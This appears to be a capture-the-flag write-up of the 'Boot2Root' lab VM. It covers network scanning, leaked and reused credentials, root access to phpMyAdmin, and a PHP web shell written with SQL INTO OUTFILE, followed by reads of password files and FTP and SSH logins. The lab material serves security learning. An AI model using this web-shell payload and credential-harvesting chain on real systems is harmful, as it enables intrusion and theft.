# Boot2Root

## Table of Contents


- [Boot2Root](#boot2root)
  * [Table of Contents](#table-of-contents)
  * [IP and Ports](#ip-and-ports)
  * [Web Path Scanner](#web-path-scanner)
  * [Exploring the forum](#exploring-the-forum)
  * [Reading lmezard emails](#reading-lmezard-emails)
  * [Exploiting phpmyadmin](#exploiting-phpmyadmin)
  * [lmezard user](#lmezard-user)

<small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>


## IP and Ports

Obtaining IP address of the virtual machine, and it's open ports

First, we need to find what our `Bridged Adaptor` name is.

![VirtualBox](assets/VirtualBox.png)

Here, it's `wlp2s0`

Now we would like to know the ip address of this interface:

```sh
ip a | grep -A 2 wlp2s0:
2: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 14:4f:8a:04:eb:5b brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.40/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp2s0
```

With this information between our hands, we will get the IP adresses behind this interface :

```sh
nmap -sn 192.168.1.40/24              
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 11:38 CET
...
Nmap scan report for 192.168.1.7
Host is up (0.0013s latency).
...
```

A couple of adresses show up, but only one is missing when the VM is shutdown. We will use it.

```sh
nmap 192.168.1.7                
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 11:40 CET
Nmap scan report for 192.168.1.7
Host is up (0.00018s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```

Alternative (macOS):

* get the name and ip of the host by launching ```nmap``` on the subnet
```
➜  boot2root git:(master) nmap -sn 192.168.1.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 14:02 CET
Nmap scan report for box (192.168.1.1)
Host is up (0.010s latency).
Nmap scan report for MBP-de-Romain (192.168.1.21)
Host is up (0.00033s latency).
Nmap scan report for BornToSecHackMe (192.168.1.22)
Host is up (0.00080s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.50 seconds
```
* get the open ports:
```
➜  boot2root git:(master) nmap BornToSecHackMe
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 14:04 CET
Nmap scan report for BornToSecHackMe (192.168.1.22)
Host is up (0.00067s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds
```

## Web Path Scanner

It exist an automated tool for `web path scanner` : [Dirsearch](https://github.com/maurosoria/dirsearch)

Let's make a search for http: (I will format output to only keep the interesting ones, aka removing responses 403)

```sh
python3 dirsearch.py -u http://192.168.1.7/

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 30 | Wordlist size: 11793

Target: http://192.168.1.7/

[12:18:10] Starting:
[12:19:54] 301 -  310B  - /fonts  ->  http://192.168.1.7/fonts/
[12:20:02] 200 -    1KB - /index.html

Task Completed
```

Let's do the same thing for https:

```sh
python3 dirsearch.py -u https://192.168.1.7/

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 30 | Wordlist size: 11793

Target: https://192.168.1.7/

[12:23:26] Starting:
[12:24:38] 301 -  312B  - /forum  ->  https://192.168.1.7/forum/
[12:24:38] 200 -    5KB - /forum/
[12:25:02] 301 -  317B  - /phpmyadmin  ->  https://192.168.1.7/phpmyadmin/
[12:25:03] 200 -    7KB - /phpmyadmin/
[12:25:03] 200 -    7KB - /phpmyadmin/index.php
[12:25:30] 302 -    0B  - /webmail/  ->  src/login.php

Task Completed
```

## Exploring the forum

Accessing [https://192.168.1.7/forum/](https://192.168.1.7/forum/)

One post attract our attention: [https://192.168.1.7/forum/index.php?id=6](https://192.168.1.7/forum/index.php?id=6)
```
Probleme login ? - lmezard, 2015-10-08, 00:10
```
User `lmezard` as troubles login in, and copy paste to us some commandline output.

During his numerous attempts, it mixes up one time his username and password:

```sh
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

we can now connect to the forum using:

```
user: lmezard
pass: !q\]Ej?*5K5cy*AJ
```

and we can now obtain this user email address :

```
laurie@borntosec.net
```

## Reading lmezard emails

Accessing [https://192.168.1.7/webmail/](https://192.168.1.7/webmail/)

with the following credentials (yes this user kept the same password between the forum and his webmail account!):
```
user: laurie@borntosec.net
pass: !q\]Ej?*5K5cy*AJ
```

One mail with object `DB Access` obviously attract our attention:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

## Exploiting phpmyadmin

Accessing [https://192.168.1.7/phpmyadmin/index.php](https://192.168.1.7/phpmyadmin/index.php/)

with the following credentials:

```
user: root
pass: Fg-'kKXBj87E:aJ$
```

we would like to have a shell access, which we could do by writing ourselves a page specially for it with a SQL request.
For this we need a folder with write rights.

Luckily for us, they use the template [my little forum](https://github.com/ilosuna/mylittleforum) for the forum.

Reading the README.md, one detail attract our attention :

```
Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
```

we now know where to write : `/var/www/forum/templates_c/`!

```sql
SELECT "<html><body><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body><script>document.getElementById(\"cmd\").focus();</script></html>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
```

we can now access this shell interface with [https://192.168.1.7/forum/templates_c/cmd.php](https://192.168.1.7/forum/templates_c/cmd.php)

looking at the home :

```sh
ls /home
LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz
```

`LOOKATME` is a directory containing only a file named `password`, let's cat it:

```sh
cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

It's a password containing the credentials to user `lmezard` for conencting to the vm.

Ther was multiple open ports discovered at the 1st step, let's check for ssh and ftp :

Having a look at `sshd_config` let us know we will not be able to ssh with it.

```sh
cat /etc/ssh/sshd_config | grep AllowUsers
AllowUsers ft_root zaz thor laurie
```

Having a look for ftp configuration:
```sh
cat /etc/ftpusers
# /etc/ftpusers: list of users disallowed FTP access. See ftpusers(5).
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
nobody
```
we will be able to use ftp !

## lmezard user

With the previously discovered credentials:

```
user: lmezard
pass: G!@M6f4Eatau{sF"
```

let's connect with ftp

```sh
ftp 192.168.1.7 21
Connected to 192.168.1.7.
220 Welcome on this server
Name (192.168.1.7:ezalos): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get fun
local: fun remote: fun
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0.01 secs (63.9546 MB/s)
ftp> get README
local: README remote: README
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for README (96 bytes).
226 Transfer complete.
96 bytes received in 0.00 secs (261.1421 kB/s)
ftp> 221 Goodbye.
```

let's have a look at the README:
```sh
cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

The fun file is pretty mixed up, but with the help of python and some regex we get it back to an useable c file !

```sh
python3 ./scripts/fun.py fun > out.c && gcc out.c -o let_the_fun_begin && ./let_the_fun_begin
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%                        
```

Following the instructions:

```sh
echo -n  Iheartpwnage | shasum -a 256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

we can now connect to ssh !

## SSH laurie

Connecting by ssh with the following credentials:
```sh
user: laurie
pass: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

we want to obtain her home directory:

```sh
scp -r laurie@192.168.1.7:~ .
```
